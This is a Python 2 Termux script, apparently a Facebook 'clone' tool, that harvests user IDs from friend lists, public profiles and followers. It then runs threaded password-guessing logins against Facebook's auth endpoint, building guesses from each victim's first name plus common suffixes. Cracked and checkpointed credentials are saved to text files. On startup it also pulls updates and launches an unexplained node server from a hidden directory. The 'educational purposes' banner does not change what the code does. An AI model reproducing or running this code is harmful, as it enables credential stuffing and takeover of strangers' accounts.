#/usr/bin/python2
#writen/coded/by/Akash

try:

    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests

    from multiprocessing.pool import ThreadPool

except ImportError:

    os.system("pip2 install requests")

    os.system("python2 harry.py")

os.system("clear")



if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):

    os.system("apt update && apt install nodejs -y")

from requests.exceptions import ConnectionError

os.system("git pull")

if not os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("cd ..... && pip install progress")

    os.system("cd ..... && npm install")

    os.system("cd ..... && node index.js &")

    os.system("clear")

    time.sleep(10)

elif os.path.isfile("/data/data/com.termux/files/home/Crack-world/...../node_modules/bytes/index.js"):

    os.system("fuser -k 5000/tcp &")

    os.system("#")

    os.system("cd ..... && node index.js &")

    os.system("clear")

bd=random.randint(2e7, 3e7)

sim=random.randint(2e4, 4e4)

header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}

reload(sys)

sys.setdefaultencoding("utf-8")

c = "\033[1;92m"

c2 = "\033[0;97m"

c3 = "\033[1;91m"
#Dev/fiaz/Akash
logo = """ 

\033[1;91mA CLEAVER TEAM BD
\033[1;91mWE ARE TRYING TO HELP NETIZENS
\033[1;91mTHIS TOOL IS ONLY FOR EDUCATIONAL PURPOSES

\033[1;97m------------------------------------------------
\033[1;97mOwner : EXPERT ZONE TEAM
\033[1;97mFacebook : BLANK ID, BOSS!
\033[1;97mGithub : git clone https://github.com/EXPERT-ZONE-TEAM
\033[1;92mNote : Please Follow EXPERT ZONE Team
\033[1;97m------------------------------------------------

"""
def main():

    os.system("clear")

    print logo

    print("")

    print("\033[0;97m( Cloning Main Menu )").center(50)

    print("")

    print("\033[1;97m(1)\033[1;91m -> \033[1;93mCLONE PUBLIC ID (FAST)")

    print("")

    print("\033[1;97m(2)\033[1;91m -> \033[1;93mOWNER INFO")

    print("")

    print("\033[1;97m(3)\033[1;91m  -> \033[1;93mLOGOUT USl")

    print("")

    main_select()

def main_select():

    IKB = raw_input("\033[1;97m-> Select \033[1;93m ")

    if IKB =="1":

        login()

    if IKB =="2":

        os.system("xdg-open https://t.me/EXPERTZONE1")

	main()

    elif IKB =="0":

        os.system("exit")

    else:

        print("-> Please select a valid option").center(50)

        time.sleep(2)

        main()

def login():

    os.system("clear")

    print logo

    print("")

    print("\033[0;97m( LOGIN MAIN MENU )").center(50)

    print("")

    print("\033[1;97m(1)\033[1;91m -> \033[1;93mLogin Using Token")

    print("")

    print("\033[1;97m(2)\033[1;91m -> \033[1;93mLogin Using ID/Password")

    print("")

    print("\033[1;97m(3)\033[1;91m -> \033[1;93mMain menu back")

    print("")

    login_select()

def login_select():

    IKB = raw_input(" \033[1;97mOption -> \033[1;97m ")

    if IKB =="1":

        os.system("clear")

        print logo

        print("")

	print("( Login With Token )").center(50)

	print("")

        token = raw_input("-> Paste Token Here \033[0;93m")

        token_s = open(".fb_token.txt","w")

        token_s.write(token)

        token_s.close()

        try:

            r = requests.get("https://graph.facebook.com/me?access_token="+token)

            q = json.loads(r.text)

            name = q["name"]

            nm = name.rsplit(" ")[0]

            print("")

            print("\033[1;92mYour Token Login Successfully").center(50)

            time.sleep(1)

	    os.system("xdg-open https://t.me/EXPERTZONE1")


	    time.sleep(1)

            menu()

        except (KeyError , IOError):

            print("")

            print("\033[1;92mToken invalid or Account has checkpoint\033[0;93m").center(50)

            print("")

            time.sleep(2)

            login()

    elif IKB =="2":

        login_fb()

    elif IKB =="3":

        main()

    else:

        print("")

        print("Select a valid option").center(50)

        print("")

        login_select()

def login_fb():

	os.system("clear")

	print logo

	print("")

	print("[ login with ID/Password ]").center(50)

	print("")

        id = raw_input("\033[1;93m Email/ID/Number :\033[1;97m ")

        id1 = id.replace(' ','')

        id2 = id1.replace('(','')

        uid = id2.replace(')','')

        pwd = raw_input("\033[1;93m Password :\033[1;97m ")

        print("")

        data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+uid+"&locale=en_US&password="+pwd+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text

        q = json.loads(data)

        if "access_token" in q:

            login_s = open(".login.txt","w")

            login_s.write(q["access_token"])

            login_s.close()

            print("\t\033[1;92mLogin Successfull\033[0;97m")

            time.sleep(1)

            menu()

        else:

            if "www.facebook.com" in q["error_msg"]:

                print ("\n\033[1;93m-> Login Failed . Account Has a Checkpoint\033[0;97m")

                time.sleep(1)

                login_fb()

            else:

                print("\n\033[1;93m-> Login Failed.Email/ID/Number OR Password May BE Wrong\033[0;97m")

                time.sleep(1)

                login_fb()



def menu():

    global token

    os.system("clear")

    print logo

    try:

        token = open(".fb_token.txt","r").read()

    except (KeyError , IOError):

        login()

    try:

        r = requests.get("https://graph.facebook.com/me?access_token="+token)

        q = json.loads(r.text)

        nm = q["name"]

        nmf = nm.rsplit(" ")[0]

        ok = nmf

    except (KeyError , IOError):

        print("")

        print("login account has checkpoint").center(50)

        print("")

        os.system("rm -rf .fb_token.txt")

        time.sleep(1)

        login()

    except requests.exceptions.ConnectionError:

        print logo

        print("")

        print("Your internet connection failed").center(50)

        print("")

        time.sleep(2)

        menu()

    os.system("clear")

    print logo

    print("")

    print("\t\033[1;92mLogin Account : " +nm)

    print("")

    print("\033[1;97m[1]\033[1;91m -> \033[1;93mCrack From Friendlist")

    print("")

    print("\033[1;97m[2]\033[1;91m -> \033[1;93mCrack From Public ID")

    print("")

    print("\033[1;97m[3]\033[1;91m -> \033[1;93mCrack From Followers ID")

    print("")

    print("\033[1;97m[0]\033[1;91m -> \033[1;93mlogout")

    print("")

    menu_select()

def menu_select():

	select = raw_input("\033[1;97mOption : ")

	id=[]

	oks=[]

	cps=[]

	if select=="1":

		os.system("clear")

		print logo

		print("")

		r = requests.get("https://graph.facebook.com/me/friends?access_token="+token, headers=header)

		z = json.loads(r.text)

		for s in z["data"]:

			uid=s['id']

			na=s['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'|'+nm)

	if select =="2":

		os.system("clear")

		print(logo)

		print("")

		idt = raw_input("\033[1;97m-> Put Public ID/Username :\033[1;93m ")

		os.system("clear")

		print logo

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)

			q = json.loads(r.text)

			print("-> Account Name : "+q["name"])

		except (KeyError , IOError):

		    print("")

		    print("\033[1;97your login account has checkpoint").center(50)

		    print("")

		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)

		z = json.loads(r.text)

		for i in z["data"]:

			uid=i['id']

			na=i['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'|'+nm)

	elif select =="3":

		os.system("clear")

		print logo

		print("")

		idt = raw_input("\033[1;97m-> Put ID/Username :\033[1;93m ")

		os.system("clear")

		print logo

		try:

			r = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token, headers=header)

			q = json.loads(r.text)

			print(" Account Name : "+q["name"])

		except (KeyError , IOError):

		    print("")

		    print("\033[1;97m login id has checkpoint").center(50)

		    print("")

		    time.sleep(3)

		    menu()

		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=5000", headers=header)

		z = json.loads(r.text)

		for i in z["data"]:

			uid=i['id']

			na=i['name']

			nm=na.rsplit(" ")[0]

			id.append(uid+'|'+nm)

	elif select =="0":

	    os.system("exit")

	else:

	    print("")

	    print("Please Select A Valid Option").center(50)

	    time.sleep(2)

	    menu_select()

	print("\033[1;97m-> Total IDs : "+str(len(id)))

	time.sleep(0.5)

	print("\033[1;97m-> Please wait clone account will be appear here")

	print 47*("-")

	print('')



	def main(arg):

		user=arg

		uid,name=user.split("|")

		try:

		    pass1=name+"123"

		    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		    d=json.loads(q)

		    if 'www.facebook.com' in d['error_msg']:

		        print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass1)

		        cp=open("cp.txt","a")

		        cp.write(uid+" | "+pass1+"\n")

		        cp.close()

		        cps.append(uid)

		    else:

		    	if "access_token" in d:

		            print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass1+"\x1b[1;0m")

		            ok=open("ok.txt","a")

		            ok.write(uid+" | "+pass1+"\n")

		            ok.close()

		            oks.append(uid)

		        else:

		            pass2=name+"1234"

		            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		            d=json.loads(q)

		            if 'www.facebook.com' in d['error_msg']:

		                print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass2)

		                cp=open("cp.txt","a")

		                cp.write(uid+" | "+pass2+"\n")

		                cp.close()

		                cps.append(uid)

		            else:

		                if 'access_token' in d:

		                    print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass2+"\x1b[1;0m")

		                    ok=open("ok.txt","a")

		                    ok.write(uid+" | "+pass2+"\n")

		                    ok.close()

		                    oks.append(uid)

		                else:

		                    pass3=name+"12345"

		                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                    d=json.loads(q)

		                    if 'www.facebook.com' in d['error_msg']:

		                        print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass3)

		                        cp=open("cp.txt","a")

		                        cp.write(uid+" | "+pass3+"\n")

		                        cp.close()

		                        cps.append(uid)

		                    else:

		                        if 'access_token' in d:

		                            print(" \x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass3+"\x1b[1;0m")

		                            ok=open("ok.txt","a")

		                            ok.write(uid+" | "+pass3+"\n")

		                            ok.close()

		                            oks.append(uid)

		                        else:

		                            pass4=name+"786"

		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                            d=json.loads(q)

		                            if 'www.facebook.com' in d['error_msg']:

		                                print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass4)

		                                cp=open("cp.txt","a")

		                                cp.write(uid+" | "+pass4+"\n")

		                                cp.close()

		                                cps.append(uid)

		                            else:

		                                if 'access_token' in d:

		                                    print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass4+"\x1b[1;0m")

		                                    ok=open("ok.txt","a")

		                                    ok.write(uid+" | "+pass4+"\n")

		                                    ok.close()

		                                    oks.append(uid)

		                                else:

		                                    pass5="102030"

		                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                    d=json.loads(q)

		                                    if 'www.facebook.com' in d['error_msg']:

		                                        print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass5)

		                                        cp=open("cp.txt","a")

		                                        cp.write(uid+" | "+pass5+"\n")

		                                        cp.close()

		                                        cps.append(uid)

		                                    else:

		                                        if 'access_token' in d:

		                                            print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass5+"\x1b[1;0m")

		                                            ok=open("ok.txt","a")

		                                            ok.write(uid+" | "+pass5+"\n")

		                                            ok.close()

		                                            oks.append(uid)

		                                        else:

		                                            pass6="223344"

		                                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                            d=json.loads(q)

		                                            if 'www.facebook.com' in d['error_msg']:

		                                                print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass6)

		                                                cp=open("cp.txt","a")

		                                                cp.write(uid+" | "+pass6+"\n")

		                                                cp.close()

		                                                cps.append(uid)

		                                            else:

		                                                if 'access_token' in d:

		                                                    print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass6+"\x1b[1;0m")

		                                                    ok=open("ok.txt","a")

		                                                    ok.write(uid+" | "+pass6+"\n")

		                                                    ok.close()

		                                                    oks.append(uid)

		                                                else:

		                                                    pass7=name+"12"

		                                                    q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=vi_vn&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c", headers=header).text

		                                                    d=json.loads(q)

		                                                    if 'www.facebook.com' in d['error_msg']:

		                                                        print("\x1b[1;93m[EXPERT-7 DAYS] "+uid+" | "+pass7)

		                                                        cp=open("cp.txt","a")

		                                                        cp.write(uid+" | "+pass7+"\n")

		                                                        cp.close()

		                                                        cps.append(uid)

		                                                    else:

		                                                        if 'access_token' in d:

		                                                            print("\x1b[1;97m[EXPERT-HACK] "+uid+" | "+pass7+"\x1b[1;0m")

		                                                            ok=open("ok.txt","a")

		                                                            ok.write(uid+" | "+pass7+"\n")

		                                                            ok.close()

		                                                            oks.append(uid)





		except:

			pass



	p = ThreadPool(30)

	p.map(main, id)

	print (" ")

	print (47*"-")

	print ("-> Your Process has completed Successful")

	print ("-> Total Cp/Ok : "+str(len(cps)) + "/"+str(len(oks)))

	print (47*"-")

	raw_input("\t\x1b[0;97mPress enter to main menu back")

	menu()



if __name__ == '__main__':

    main()




